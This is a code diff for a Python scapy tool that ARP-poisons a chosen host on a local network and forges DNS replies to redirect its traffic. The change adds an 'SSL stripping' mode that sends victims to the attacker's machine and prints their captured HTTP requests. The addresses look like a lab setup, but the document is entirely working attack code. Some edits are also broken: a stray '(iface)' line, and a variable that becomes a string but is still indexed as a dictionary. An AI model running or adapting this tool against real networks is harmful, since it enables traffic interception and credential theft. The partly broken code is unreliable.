@@ -12,25 +12,32 @@ dns_hosts = {
     b"belot.bg.": "10.0.2.6",
 }
 
-# target_ip = "10.0.2.4"
-# ip_to_spoof = "10.0.2.6"
-
-def dns_spoofing():
+m1 = "10.0.2.4"
+m2 = "10.0.2.6"
+m2_url = "10.0.2.6"
+def dns_spoofing(ssl_strip=False):
     conf.verb = 0 # make scapy verbose (no output)
 
     iface = fpc.get_interface()
+    my_addresses = sh.get_my_details(iface)
 
     spoof.printf("Searching for active hosts in the subnet...", 4)
-    spoof.printf("")
     active_hosts = sh.search_hosts(iface)
 
     spoof.printf("")
-    spoof.printf("Input the IP address of the target out of the active hosts:", 1)
+    spoof.printf("Input the IP address of the target out of the active hosts:")
     target = fpc.validate_ip(active_hosts, "")
 
-    spoof.printf("")
-    spoof.printf("Input the IP address of the server out of the active hosts:", 1)
-    server = fpc.validate_ip(active_hosts, target["ip"])
+
+
+    if ssl_strip == True:
+        server = my_addresses['ip']
+        print("SSL Stripping Enabled")
+    else:
+        spoof.printf("")
+        spoof.printf("Input the IP address of the server out of the active hosts:")
+        server = fpc.validate_ip(active_hosts, target)
+
 
     # Get the IP addresses of the default gateways of the selected interface
     gateways = []
@@ -40,7 +47,7 @@ def dns_spoofing():
 
     spoof.printf("\nStarting poisoning...")
     # Start ARP poisoning
-    my_addresses = sh.get_my_details(iface)
+    (iface)
     for gw_ip, gw_iface in gateways:
         arp.one_way_arp_start(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface)
 
@@ -52,7 +59,7 @@ def dns_spoofing():
 
 def dns_spoof_and_repoison(my_addresses, gateways, target, server, iface):
     last_poison_time = time.time() - REPOISON_TIME
-    _filter = "udp"
+    _filter = "udp or tcp"
 
     while True:
         # sniff for 1 packet that adheres to the {_filter}
@@ -74,11 +81,12 @@ def process_udp_pkt(target, server, iface):
         if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
             resp_packet = build_dns_response_packet(pkt, server["ip"])
             sendp(resp_packet, iface=iface)
-        else: 
-            pass
+        elif pkt.haslayer(HTTPRequest) and pkt[IP].dst == m2:
+            print(pkt.show())
             #spoof.printf("Found another packet")
     return process_udp_pkt_inside
 
+# Remake DNS packet
 def build_dns_response_packet(pkt, malicious_ip):
         eth = Ether(
                     src = pkt[Ether].dst,
@@ -113,4 +121,4 @@ def build_dns_response_packet(pkt, malicious_ip):
 
 # call main
 if __name__=="__main__":
-    dns_spoofing()
+    dns_spoofing(True)
